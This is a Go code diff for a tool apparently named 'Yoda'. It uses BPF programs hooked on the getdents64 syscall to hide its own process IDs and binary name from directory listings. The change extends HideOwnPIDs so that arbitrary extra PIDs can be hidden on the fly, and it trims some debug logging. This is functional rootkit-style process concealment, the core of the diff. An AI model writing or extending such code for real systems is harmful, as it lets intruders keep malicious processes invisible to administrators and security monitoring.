@@ -3,7 +3,6 @@ package core
 
 import (
 	"fmt"
-	"log"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -64,7 +63,6 @@ func getYodaPIDs() ([]int, error) {
 			pids = append(pids, pid)
 		}
 	}
-	fmt.Printf("getYodaPIDs: %v\n", pids)
 	return pids, nil
 }
 
@@ -121,11 +119,24 @@ func populateHiddenEntries(hiddenMap *ebpf.Map, pids []int, binName string) erro
 }
 
 // HideOwnPIDs loads the BPF program and populates the hidden_entries map with this program's PIDs.
-func HideOwnPIDs() (enterLink, exitLink link.Link, err error) {
+// Peut prendre des PIDs supplémentaires à cacher à chaud (extraPIDs...)
+func HideOwnPIDs(extraPIDs ...int) (enterLink, exitLink link.Link, err error) {
 	pids, err := getYodaPIDs()
 	if err != nil {
 		return nil, nil, err
 	}
+	pidSet := make(map[int]struct{})
+	for _, pid := range pids {
+		pidSet[pid] = struct{}{}
+	}
+	for _, pid := range extraPIDs {
+		pidSet[pid] = struct{}{}
+	}
+	mergedPIDs := make([]int, 0, len(pidSet))
+	for pid := range pidSet {
+		mergedPIDs = append(mergedPIDs, pid)
+	}
+
 	binName, err := getBinaryName()
 	if err != nil {
 		return nil, nil, err
@@ -138,7 +149,7 @@ func HideOwnPIDs() (enterLink, exitLink link.Link, err error) {
 	if !ok {
 		return nil, nil, fmt.Errorf("hidden_entries map not found in BPF object")
 	}
-	if err := populateHiddenEntries(hiddenMap, pids, binName); err != nil {
+	if err := populateHiddenEntries(hiddenMap, mergedPIDs, binName); err != nil {
 		return nil, nil, err
 	}
 
@@ -159,7 +170,7 @@ func HideOwnPIDs() (enterLink, exitLink link.Link, err error) {
 		enterLink.Close()
 		return nil, nil, fmt.Errorf("failed to attach sys_exit_getdents64: %w", err)
 	}
-	log.Printf("Populated hidden_entries with PIDs: %v and binary name: %s", pids, binName)
+	fmt.Printf("🔒 Hidden PIDs: %v\n", mergedPIDs)
 	return enterLink, exitLink, nil
 }
 
